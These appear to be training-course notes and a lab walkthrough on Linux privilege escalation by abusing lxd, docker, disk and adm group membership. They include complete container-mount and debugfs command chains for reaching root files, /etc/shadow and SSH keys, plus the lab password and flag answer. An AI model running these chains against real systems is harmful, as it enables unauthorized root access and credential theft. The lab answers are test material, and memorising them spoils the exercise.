# Privileged Groups

## ID
703

## Module
Linux Privilege Escalation

## Kind
notes

## Title
Section 10 — Privileged Groups

## Description
Covers abusing membership in privileged Linux groups (lxd, docker, disk, adm) to escalate privileges or access sensitive data on the host.

## Tags
lxd, docker, disk, adm, privileged-groups, privilege-escalation

## Commands
- `id`
- `lxc image import alpine.tar.gz alpine.tar.gz.root --alias alpine`
- `lxc init alpine r00t -c security.privileged=true`
- `lxc config device add r00t mydev disk source=/ path=/mnt/root recursive=true`
- `lxc start r00t && lxc exec r00t /bin/sh`
- `docker run -v /root:/mnt -it ubuntu`
- `grep -rw "flag" /var/log 2>/dev/null`

## What This Section Covers
Certain Linux group memberships grant abilities equivalent to root access. The `lxd`/`docker` groups allow mounting the host filesystem inside a privileged container, the `disk` group grants raw device access via `/dev`, and the `adm` group allows reading all logs in `/var/log`. This section demonstrates how to identify and abuse each of these group memberships during post-exploitation.

## Methodology
1. **Check group membership** — run `id` to see which groups the current user belongs to.
2. **Identify exploitable groups** — look for `lxd`, `docker`, `disk`, or `adm` in the output.
3. **Exploit based on group**:
   - **lxd** — import Alpine image → create privileged container → mount host `/` → shell into container as root → access `/mnt/root/`
   - **docker** — run a container mounting host dirs (e.g., `docker run -v /root:/mnt -it ubuntu`) → read SSH keys, `/etc/shadow`, etc.
   - **disk** — use `debugfs /dev/sda1` to browse the entire filesystem as root
   - **adm** — read logs under `/var/log/` for credentials, flags, cron jobs, user actions

## Multi-step Workflow (optional)
```
# LXD privilege escalation (full chain)
unzip alpine.zip
cd 64-bit\ Alpine/
lxd init                    # accept all defaults
lxc image import alpine.tar.gz alpine.tar.gz.root --alias alpine
lxc init alpine r00t -c security.privileged=true
lxc config device add r00t mydev disk source=/ path=/mnt/root recursive=true
lxc start r00t
lxc exec r00t /bin/sh
# Now at root inside container — host FS at /mnt/root/
cd /mnt/root/root
cat /etc/shadow             # or grab SSH keys, etc.
```

## Lab — Questions & Answers
| Q | Answer | Found In / Method |
|---|--------|-------------------|
| Q1 — Use secaudit's privileged group rights to locate a flag | ch3ck_th0se_gr0uP_m3mb3erSh1Ps | SSH as `secaudit` (adm group) → `grep -rw "flag" /var/log 2>/dev/null` → found in `/var/log/apache2/access.log` |

## Step-by-Step Walkthrough

### Setup
```
ssh secaudit@<TARGET_IP>
# password: Academy_LLPE!
```

```
┌─[us-academy-1]─[10.10.14.118]─[htb-ac413848@pwnbox-base]─[~]
└──╼ [★]$ ssh secaudit@10.129.2.210

The authenticity of host '10.129.2.210 (10.129.2.210)' can't be established.
ECDSA key fingerprint is SHA256:jqHwbeBBQLd/z1BFRM732tTqQbhKGni0KhrGMszsiVM.
Are you sure you want to continue connecting (yes/no/[fingerprint])? Yes
Warning: Permanently added '10.129.2.210' (ECDSA) to the list of known hosts.
htb-student@10.129.2.210's password: 
Welcome to Ubuntu 16.04.4 LTS (GNU/Linux 4.4.0-116-generic x86_64)

<SNIP>

secaudit@NIX02:~$
```

### Q1 — Locate the flag using adm group rights
```
# 1. Confirm group membership
id
```

```
secaudit@NIX02:~$ id

uid=1010(secaudit) gid=1010(secaudit) groups=1010(secaudit),4(adm)
```

```
# 2. Search /var/log/ for the flag
grep -rw "flag" /var/log 2>/dev/null
```

```
secaudit@NIX02:~$ grep -rw "flag" /var/log 2>/dev/null

/var/log/apache2/access.log:10.10.14.3 - - [01/Sep/2020:05:34:22 +0200] "GET /flag%20=%20ch3ck_th0se_gr0uP_m3mb3erSh1Ps! HTTP/1.1" 301 409 "-" "Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0"
/var/log/apache2/access.log:10.10.14.3 - - [01/Sep/2020:05:34:22 +0200] "GET /flag%20=%20ch3ck_th0se_gr0uP_m3mb3erSh1Ps HTTP/1.1" 404 27847 "-" "Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0"
```

The flag is URL-encoded in the Apache access log: `flag = ch3ck_th0se_gr0uP_m3mb3erSh1Ps`

Answer: `ch3ck_th0se_gr0uP_m3mb3erSh1Ps`

## Key Takeaways
- `id` is the fastest way to check for privileged group membership — run it immediately after landing on a box.
- **lxd/docker group = root**: mounting the host filesystem into a privileged container gives full read/write access to everything, including `/etc/shadow` and SSH keys.
- **disk group = root**: raw device access via `debugfs` bypasses all filesystem permissions.
- **adm group ≠ root, but dangerous**: reading `/var/log/` can leak credentials, API keys, flags, user activity, and cron job details that enable further attacks.
- On the CPTS exam, always check for non-obvious groups — the privesc path may not be a classic SUID/sudo vector but a group membership instead.

## Gotchas
- The LXD bridge configuration step (`dpkg-reconfigure`) fails without root — this is expected and doesn't block the exploit. Just continue with `lxc image import`.
- `grep -r` on `/var/log/` can be slow on large systems — narrow with `-i "flag\|HTB\|password\|key"` if needed.
- The `adm` group only grants **read** access to logs, not write. You can't plant files or escalate directly — it's an information-gathering step that feeds into the next attack.
